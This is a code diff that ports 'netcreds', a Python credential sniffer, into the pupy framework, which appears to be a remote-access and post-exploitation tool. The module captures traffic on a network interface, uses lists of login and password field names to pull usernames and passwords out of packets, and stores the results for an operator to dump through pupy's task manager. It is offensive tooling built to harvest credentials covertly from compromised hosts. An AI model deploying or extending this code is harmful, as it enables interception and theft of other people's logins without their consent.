@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # #!/usr/bin/env python2
 import platform
 windows = platform.system() == "Windows"
@@ -6,7 +6,17 @@ linux   = platform.system() == "Linux"
 
 if not windows:
     from os import geteuid, devnull
-from scapy.all import *
+
+import scapy.arch
+
+from scapy.packet import Raw
+from scapy.layers.inet import IP,UDP,TCP
+from scapy.layers.l2 import Ether
+from scapy.layers.snmp import SNMP
+from scapy.config import conf
+from scapy.sendrecv import sniff
+
+# from scapy.all import *
 conf.verb=0
 from sys import exit
 import binascii
@@ -23,12 +33,14 @@ from urllib import unquote
 import binascii
 import threading
 
+import copy
+import re
+
+import pupy
+
 # Unintentional code contributors:
 #     Laurent Gaffie
 #     psychomario
-
-if not windows:
-    DN = open(devnull, 'w')
 
 pkt_frag_loads = OrderedDict()
 challenge_acks = OrderedDict()
@@ -54,84 +66,59 @@ http_search_re = '((search|query|&q|\?q|search\?p|searchterm|keywords|keyword|co
 W = '\033[0m'  # white (normal)
 T = '\033[93m'  # tan
 
-interface = None
-filterip = None
-
 ############## Stat / Stop / Dump functions ##############
 
-def netcreds_start(_interface=None, _filterip=None, listWinInterfaces=False):
-    # For Windows
-    # if listWinInterfaces and windows:
-    #     # function only supported on Windows
-    #     self.list_interfaces_windows()
-    #     return 
-
-    # check if admin
-    if not windows and geteuid():
-        return 'not_root'
-
-    if hasattr(sys, 'NETCREDS_THREAD'):
+def netcreds_start(interface=None, filterip=None, listWinInterfaces=False):
+    if pupy.manager.active(Netcreds):
         return False
 
-    global interface
-    global filterip
-    interface = _interface
-    filterip = _filterip
+    try:
+        pupy.manager.create(
+            Netcreds, interface=interface, filterip=filterip
+        )
+    except:
+        return False
 
-    netcreds = Netcreds()
-    netcreds.start()
-    sys.NETCREDS_THREAD=netcreds
     return True
 
 def netcreds_dump():
-    if hasattr(sys, 'NETCREDS_THREAD'):
-        return sys.NETCREDS_THREAD.dump()
+    nc = pupy.manager.get(Netcreds)
+    if nc:
+        return nc.results
 
 def netcreds_stop():
-    if hasattr(sys, 'NETCREDS_THREAD'):
-        sys.NETCREDS_THREAD.stop()
-        # del sys.NETCREDS_THREAD
-        return True
-    return False
+    nc = pupy.manager.get(Netcreds)
+    if nc:
+        pupy.manager.stop(Netcreds)
+        return nc.results
 
 ############## Main class ##############
 
-class Netcreds(threading.Thread):
-    def __init__(self, *args, **kwargs):
-        threading.Thread.__init__(self, *args, **kwargs)
-        self.daemon=True
-        if not hasattr(sys, 'NETCREDS_BUFFER'):
-            sys.NETCREDS_BUFFER=""
-            
-        self.stopped=False
-        self.interface=interface
+class Netcreds(pupy.Task):
+    def __init__(self, interface=None, filterip=None, *args, **kwargs):
+        super(Netcreds, self).__init__(*args, **kwargs)
+        self.interface = interface
         self.filterip = filterip
 
-    def append_key_buff(self, k):
-        sys.NETCREDS_BUFFER+=k
- 
-    def stop(self):
-        self.stopped=True
-
-    def dump(self):
-        res=sys.NETCREDS_BUFFER
-        sys.NETCREDS_BUFFER=""
-        return res
-
-    def run(self):
+    def task(self):
         # Find the active interface
         if self.interface:
-            conf.iface = self.interface
-        elif not windows:
-            conf.iface = self.iface_finder_unix()
+            if windows:
+                conf.iface = scapy.arch.pcapname(self.interface)
+            else:
+                conf.iface = self.interface
+
         # else:
             # # An interface has to be specify for windows hosts (list_interfaces_windows could be used to list it)
             # exit('[-] Please specify an interface')
 
-        if self.filterip:
-            sniff(iface=conf.iface, prn=pkt_parser, filter="not host %s" % self.filterip, store=0)
-        else:
-            sniff(iface=conf.iface, prn=self.pkt_parser, store=0)
+        sniff(
+            iface=conf.iface,
+            prn=self.pkt_parser,
+            store=0,
+            filter='not host {}'.format(self.filterip) if self.filterip else None,
+            stop_filter=lambda p: not self.active
+        )
 
     def list_interfaces_windows(self):
         try:
@@ -139,21 +126,17 @@ class Netcreds(threading.Thread):
         except:
             print '[-] dnet needs to be installed in order to list interfaces'
             return
-        
+
         interfaces = dnet.intf()
         print '[*] Found interfaces :'
         for interface in interfaces:
             print "    %s : hw=%s ip=%s" % (interface["name"], interface.get("addr", None), interface.get("link_addr", None))
-    
-    def iface_finder_unix(self):
+
+    def iface_finder(self):
         try:
-            ipr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
-            for line in ipr.communicate()[0].splitlines():
-                if 'default' in line:
-                    l = line.split()
-                    iface = l[4]
-                    return iface
-        except IOError:
+            import netifaces
+            return netifaces.gateways()['default'].values()[0][1]
+        except:
             exit('[-] Could not find an internet active interface; please specify one with -i <interface>')
 
     def frag_remover(self, ack, load):
@@ -986,7 +969,7 @@ class Netcreds(threading.Thread):
                       'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                       'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                       'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
-        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
+        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                       'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                       'passwort', 'passwrd', 'wppassword', 'upasswd']
 
@@ -1005,9 +988,9 @@ class Netcreds(threading.Thread):
     def printer(self, src_ip_port, dst_ip_port, msg):
         if dst_ip_port != None:
             print_str = '[%s > %s] %s%s%s' % (src_ip_port, dst_ip_port, T, msg, W)
-            
+
             # All credentials will have dst_ip_port, URLs will not
-            self.append_key_buff("%s\n" % print_str)
+            self.append(print_str)
 
             # Escape colors like whatweb has
             # ansi_escape = re.compile(r'\x1b[^m]*m')
